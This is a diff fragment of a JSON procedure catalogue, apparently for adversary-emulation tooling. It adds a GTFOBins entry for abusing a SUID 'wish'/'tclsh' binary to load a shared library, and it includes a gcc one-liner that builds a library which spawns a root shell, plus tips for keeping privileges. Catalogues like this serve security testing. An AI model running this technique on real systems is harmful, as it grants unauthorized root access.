+      "id": "gtfobins:wish:library-load:0:suid:0:wish>tclsh",
+      "name": "GTFOBINS - T1574 - wish - Library load - Suid [2aca8b1]",
+      "description": "This executable can load shared libraries that may be used to run arbitrary code in the same execution context. Binary: wish. Context: SUID. Inherits library-load behavior from tclsh.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1574",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "wish\ntclsh\nload #{lotl_gtfobins_payload_path} x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/wish",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/wish",
+        "source_bin": "wish",
+        "function": "library-load",
+        "function_label": "Library load",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "tclsh",
+        "inheritance_path": [
+          "wish",
+          "tclsh"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "payload": "As an example, the following can be used to create a minimal shared library (`lib.so`) that spawns a shell upon loading:\n\n```\necho '__attribute__((constructor)) init() { execl(\"/bin/sh\", \"sh\", 0); }' \\\n    | gcc -w -fPIC -shared -o lib.so -x c -\n```\n\nAdd the usual `-p` argument to the shell for SUID contexts. Consider calling `setuid(0);` beforehand if the executable has the `CAP_SETUID` capability assigned."
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "tclsh",
+          "inheritance_path": [
+            "wish",
+            "tclsh"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:wish:library-load:0:suid:0:wish>tclsh",
+        "source_name": "wish",
+        "source_tcodes": [
+          "T1574"
+        ],
+        "category": "library-load",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `wish` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
